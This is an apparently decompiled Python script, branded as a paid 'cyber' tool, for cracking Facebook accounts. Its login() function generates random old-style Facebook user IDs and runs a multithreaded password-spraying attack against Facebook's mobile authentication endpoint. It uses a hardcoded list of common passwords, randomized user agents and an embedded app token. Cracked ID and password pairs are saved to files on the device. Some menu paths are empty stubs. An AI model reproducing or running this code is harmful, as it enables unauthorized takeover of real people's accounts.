# =================================================================
# CODE BY >> AKASH DAS
# GITHUB >> ELITE-CYBER
# =================================================================

import requests
import bs4
import json
import os
import sys
import uuid
import random
import datetime
import time
import re
import urllib3
import rich
import base64
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from rich import pretty
from rich.text import Text as tekz
from time import localtime as lt
from concurrent.futures import ThreadPoolExecutor # This is imported and aliased multiple times
import httpx
#from os.path import path
from urllib.request import urlopen
import zlib
import pip
import urllib
import platform
import math
import shutil
import string
import hashlib
import getpass
from io import BytesIO
import pycurl
import mechanize
from urllib.request import Request
import subprocess
import threading
import itertools
import webbrowser
from rich.table import Table as me
from rich.console import Console as sol
from bs4 import BeautifulSoup as sop
from rich.console import Group as gp
from rich.panel import Panel as nel

tred = ThreadPoolExecutor
ThreadPool = ThreadPoolExecutor
MrXIDI = ThreadPoolExecutor


osRUB = os.system
cmd = os.system

from random import randint
from time import sleep as slp
from zlib import decompress

fast_work = ThreadPoolExecutor(max_workers=15).submit

# রঙের কোড (Color Codes)
A = '\x1b[1;97m'
R = '\x1b[1;91m' # This is redefined later from '\x1b[38;5;196m'
Y = '\x1b[1;33m'
G = '\x1b[1;32m' # This is redefined later from '\x1b[38;5;46m'
B = '\x1b[38;5;46m' # Note: Assigned a green color code
W = random.choice(['\x1b[1;33m', '\x1b[1;32m']) # Randomly Yellow or Green
GREEN = '\x1b[38;5;46m'
RED = '\x1b[38;5;46m' # Note: Assigned a green color code, likely a mistake in original
WHITE = '\x1b[1;97m'
YELLOW = '\x1b[1;33m'
BLUE = '\x1b[1;34m'
ORANGE = '\x1b[1;35m'
G1 = '\x1b[38;5;48m'
G2 = '\x1b[38;5;47m'
G3 = '\x1b[38;5;48m'
G4 = '\x1b[38;5;49m'
G5 = '\x1b[38;5;50m'
X = '\x1b[1;34m'
X1 = '\x1b[38;5;14m'
X2 = '\x1b[38;5;123m'
X3 = '\x1b[38;5;122m'
X4 = '\x1b[38;5;86m'
X5 = '\x1b[38;5;121m'
S = '\x1b[1;96m'
M = '\x1b[38;5;205m'

dic = {'1': 'January', '2': 'February', '3': 'March', '4': 'April', '5': 'May', '6': 'June', '7': 'July', '8': 'August', '9': 'September', '10': 'October', '11': 'November', '12': 'December'}
dic2 = {'01': 'January', '02': 'February', '03': 'March', '04': 'April', '05': 'May', '06': 'June', '07': 'July', '08': 'August', '09': 'September', '10': 'October', '11': 'November', '12': 'Devember'} # Typo in original
_now = datetime.datetime.now()
tgl = _now.day
bln = dic[str(_now.month)]
thn = _now.year
okc = f"OK-{tgl}-{bln}-{thn}.txt"
cpc = f"CP-{tgl}-{bln}-{thn}.txt"
date = f"{tgl}-{bln}"
_lt = lt()
ltx = int(_lt[3])
if ltx > 12:
    a = ltx - 12
    tag = 'PM'
else:
    a = ltx
    tag = 'AM'

loop = 0
oks = []
cps = []
twf = []
pcp = []
id = []
tokenku = []
uid = []
cid = []
plist = []

logo = '''
   \x1b[38;5;196m ██████ \x1b[33;1m██    ██ \x1b[38;5;46m██████  \x1b[34;1m███████ \x1b[38;5;196m██████  
   \x1b[38;5;196m██       \x1b[33;1m██  ██  \x1b[38;5;46m██   ██ \x1b[34;1m██      \x1b[38;5;196m██   ██ 
   \x1b[38;5;196m██        \x1b[33;1m████   \x1b[38;5;46m██████  \x1b[34;1m█████   \x1b[38;5;196m██████  
   \x1b[38;5;196m██         \x1b[33;1m██    \x1b[38;5;46m██   ██ \x1b[34;1m██      \x1b[38;5;196m██   ██ 
   \x1b[38;5;196m ██████    \x1b[33;1m██    \x1b[38;5;46m██████  \x1b[34;1m███████ \x1b[38;5;196m██   ██ 
\x1b[1;97m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
  \x1b[1;91m[\x1b[1;35m≋\x1b[1;91m] \x1b[1;92mDEVELOPER \x1b[1;91m :   \x1b[1;92mSHOHAG-KHAN
  \x1b[1;91m[\x1b[1;35m≋\x1b[1;91m] \x1b[1;92mFACEBOOK \x1b[1;91m  :   \x1b[1;92m𝐓𝐄𝐀𝐌-𝐂𝐘𝐁𝐄𝐑-𝟎𝟑
  \x1b[1;91m[\x1b[1;35m≋\x1b[1;91m] \x1b[1;92mTOOL TYPE \x1b[1;91m :   \x1b[1;92mPAID🆗
  \x1b[1;91m[\x1b[1;35m≋\x1b[1;91m] \x1b[1;92mTOOL    \x1b[1;91m   :   \x1b[1;92mONLINE
\x1b[1;97m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━'''



def lin():
    print('\x1b[1;97m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')

def CyberXdArFt(fx):
    # Reconstructed from <code object CyberXdArFt at ...>
    if len(fx) == 15:
        if fx[:10] in ('1000000000',): return '2009'
        elif fx[:9] in ('100000000',): return '2009'
        elif fx[:8] in ('10000000',): return '2009'
        elif fx[:7] in ('1000000', '1000001', '1000002', '1000003', '1000004', '1000005'): return '2009'
        elif fx[:7] in ('1000006', '1000007', '1000008', '1000009'): return '2010'
        elif fx[:6] in ('100001',): return '2010/2011'
        elif fx[:6] in ('100002', '100003'): return '2011/2012'
        elif fx[:6] in ('100004',): return '2012/2013'
        elif fx[:6] in ('100005', '100006'): return '2013/2014'
        elif fx[:6] in ('100007', '100008'): return '2014/2015'
        elif fx[:6] in ('100009',): return '2015'
        elif fx[:5] in ('10001',): return '2015/2016'
        elif fx[:5] in ('10002',): return '2016/2017'
        elif fx[:5] in ('10003',): return '2018/2019'
        elif fx[:5] in ('10004',): return '2019'
        elif fx[:5] in ('10005',): return '2020'
        elif fx[:5] in ('10006', '10007', '10008'): return '2021/2022'
        else: return '2023'
    elif len(fx) in (9, 10): return '2008/2009'
    elif len(fx) == 8: return '2007/2008'
    elif len(fx) == 7: return '2006/2007'
    else: return '2023/2024'

def clear():
    os.system('clear')
    print(logo)

def ua():
    rr = str(random.randint(9, 11))
    aZ = random.choice(string.ascii_uppercase)
    rx = str(random.randrange(1, 999))
    chrome_version = f"{random.randint(99, 175)}.0.{random.randint(0, 5)}.{random.randint(0, 5)}"
    webkit_version = f"537.36" # Simplified, original is more complex
    return f"Mozilla/5.0 (Windows NT 10.0; Win64; x64){aZ}{rx}{aZ}) AppleWebKit/{webkit_version} (KHTML, like Gecko) Chrome/{chrome_version} Safari/{webkit_version}"

def windows():
    aV = str(random.choice(range(10, 20)))
    nt_version = f"{random.choice(range(5, 7))}.1"
    chrome_version = f"{random.choice(range(8,12))}.0.{random.choice(range(552,661))}.0"
    return f'Mozilla/5.0 (Windows; U; Windows NT {nt_version}; en-US) AppleWebKit/534.{aV} (KHTML, like Gecko) Chrome/{chrome_version} Safari/534.{aV}'

def menu():
    clear()
    print('\x1b[38;5;8m(\x1b[1;97m2\x1b[38;5;8m) \x1b[1;37mOLD CRACK')
    #print('\x1b[38;5;8m(\x1b[1;97m2\x1b[38;5;8m) \x1b[1;37mOLD CRACK')
    lin()
    Xd = input('\x1b[38;5;8m(\x1b[1;97m~\x1b[38;5;8m) \x1b[1;97mCHOICE    : ')
    if Xd in ('1', '01'):
        File()
    elif Xd in ('02', '2'):
        main()

def main():
    # Reconstructed from <code object main at ...> for "OLD CRACK"
    user = []
    clear()
    print('\x1b[38;5;8m(\x1b[1;97m~\x1b[38;5;8m) \x1b[1;37mEXAMPLE   : \x1b[1;37m9999 | 20000 | 90000')
    lin()
    limit = input('\x1b[38;5;8m(\x1b[1;97m~\x1b[38;5;8m) \x1b[1;97mCHOICE    : ')
    lin()
    os.system('clear')
    print(logo)
    print('\x1b[38;5;8m(\x1b[1;97m1\x1b[38;5;8m) \x1b[1;97mMETHOD ~ (2010-2009')
    lin()
    ask = input('\x1b[38;5;8m(\x1b[1;97m~\x1b[38;5;8m) \x1b[1;97mCHOICE    : ')
    lin()
    if ask in ('1',):
        star = '10000'
    else:
        star = '100000'
    for i in range(int(limit)):
        data = str(random.choice(range(1000000000, 1999999999)))
        user.append(data)
    
    with ThreadPoolExecutor(max_workers=40) as MrDevilEx:
        os.system('clear')
        print(logo)
        print(f'\x1b[38;5;8m(\x1b[1;97m~\x1b[38;5;8m) \x1b[38;5;47mTOTAL ID : {limit} \x1b[38;5;8m(\x1b[1;97m~\x1b[38;5;8m) \x1b[38;5;47mMETHOD : \x1b[38;5;86m{ask}')
        print('\x1b[38;5;8m(\x1b[1;97m~\x1b[38;5;8m) \x1b[38;5;47mVPN.1.1.1 \x1b[38;5;8m[\x1b[38;5;47mON\x1b[1;97m/\x1b[38;5;47mOF\x1b[38;5;8m]  \x1b[38;5;47mLOGIN METHOD-USE-VPN-111')
        lin()
        for mal in user:
            uid = star + mal
            MrDevilEx.submit(login, uid)

def login(uid):
    global loop, oks
    Session = requests.session()
    sys.stdout.write(f'\r\x1b[38;5;32m({date}) ({loop}) \x1b[1;32mOK ({len(oks)})')
    sys.stdout.flush()
    pw_list = ["123123","111111","000000","654321","Mdkhan @@fflover","saim gamer@@","51897528","Rifatfreefiregamer@@@","7140138269","Arman@@gamer155","57001257","Romel@@ffid@@","'14702269","mdminhaj @@12","61989025","Mintu @@gamer567","5179911479","tagpal267@@","51986428","kumar @@@","518035","mdragib@@@666","rubel gamer@@ff","551781974","raju ffgamer@@@@","51803532","bangladesh@@@517","518072","md jisankhan@@@","6289541793","akash @@@@gamer","42789027541","king cyber@@@@","5288926541","00112233","mst jannt@@@","josim@51","96431071","mdsogib@00","5271919537","mdakbur97","7651792","mimgame@@","123456","ubdul62627@@","527829965189","minikha52626","57801916","mdkhanff@@1","60966190"]
    for pw in pw_list:
        try:
            data = {
                'adid': str(uuid.uuid4()), 'email': uid, 'password': pw, 'cpl': 'true',
                'credentials_type': 'device_based_login_password', 'source': 'device_based_login',
                'error_detail_type': 'button_with_disabled', 'format': 'json',
                'generate_session_cookies': '1', 'generate_analytics_claim': '1',
                'generate_machine_id': '1', 'family_device_id': str(uuid.uuid4()),
                'advertiser_id': str(uuid.uuid4()), 'locale': 'en_US', 'client_country_code': 'US',
                'device_id': str(uuid.uuid4()), 'method': 'auth.login',
                'api_key': '882a8490361da98702bf97a021ddc14d',
                'fb_api_req_friendly_name': 'authenticate',
                'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler'
            }
            head = {
                'content-type': 'application/x-www-form-urlencoded',
                'Host': 'graph.facebook.com',
                'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                'user-agent': ua(), 'accept-encoding': 'gzip, deflate', 'x-fb-http-engine': 'Liger'
            }
            url = 'https://b-api.facebook.com/auth/login'
            response = Session.post(url, data=data, headers=head, verify=True).json()
            if 'access_token' in response:
                print(f'\r\r{G}CYBER-OK💚 {A}➤ {G}{uid} {A}•{G} {pw}')
                open('/sdcard/MrDevilEx-OLD-OK.txt', 'a').write(f'{uid}|{pw}\n')
                oks.append(f'{uid}|{pw}')
                break
            elif 'www.facebook.com' in str(response):
                print(f'\r\r{G}CYBER-OK💚 {A}➤ {G}{uid} {A}•{G} {pw}')  # CP logic was slightly different in bytecode
                open('/sdcard/OLD-CP.txt', 'a').write(f'{uid}|{pw}\n') # Assumed CP file
                oks.append(f'{uid}|{pw}')
                break
        except Exception:
            pass
    loop += 1

def File():
    global plist, pcp
    clear()
    print(f'\x1b[38;5;8m(\x1b[1;97m~\x1b[38;5;8m) \x1b[1;37m EXAMPLE {R}  {A}➤ {G} /sdcard/test.txt')
    lin()
    file_path = input(f'\x1b[38;5;8m(\x1b[1;97m~\x1b[38;5;8m) \x1b[1;37m FILE PATH {R}  {A}➤ {G} ')
    try:
        fo = open(file_path, 'r').read().splitlines()
    except FileNotFoundError:
        print('\x1b[38;5;8m(\x1b[1;97m~\x1b[38;5;8m) \x1b[1;37m WRITE CORRECT PATH')
        time.sleep(1)
        menu()
        return
    with ThreadPoolExecutor(max_workers=30) as crack_submit:
        pass

def graph(ids, names, passlist):
    global loop, oks, cps
    sys.stdout.write(f'\r\r [CYBER-M1] [{A}] ("_") OK ➤ {G} {loop} {len(oks)}')
    sys.stdout.flush()
    pass 

try:
    if __name__ == "__main__":
        menu()
except ModuleNotFoundError as e:
    print(f"Module not found: {e}. Attempting to install...")
    if 'pycurl' in str(e):
        os.system('pip install pycurl')
    elif 'mechanize' in str(e):
        os.system('pip install mechanize')
    else:
        os.system('pip install requests futures')
    print("Please restart the script.")
except Exception as e:
    # General error handling
    print(f"An error occurred: {e}")